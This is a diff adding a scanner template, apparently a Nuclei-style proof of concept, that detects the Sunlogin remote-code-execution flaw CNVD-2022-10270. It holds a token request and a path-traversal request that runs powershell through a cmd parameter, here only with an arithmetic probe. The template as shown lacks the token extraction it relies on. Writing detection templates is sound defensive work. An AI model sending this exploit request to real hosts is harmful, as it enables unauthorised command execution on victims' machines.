@@ -1,0 +1,38 @@
+id: poc-yaml-sunlogin-windows-cnvd-2022-10270-rce
+
+info:
+  name: poc-yaml-sunlogin-windows-cnvd-2022-10270-rce
+  author: Kai
+  severity: high
+  tags: xray-converted,rce,cnvd-2022-10270,ct-384002
+  reference:
+    - https://github.com/Mr-xn/sunlogin_rce
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "verify_string"
+          - "__code"
+          - "enabled"
+  - raw:
+      - |
+        GET /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fwindowspowershell%2fv1.0%2fpowershell+{{rand_int(1000, 9999)}}*{{rand_int(1000, 9999)}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: CID={{token}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
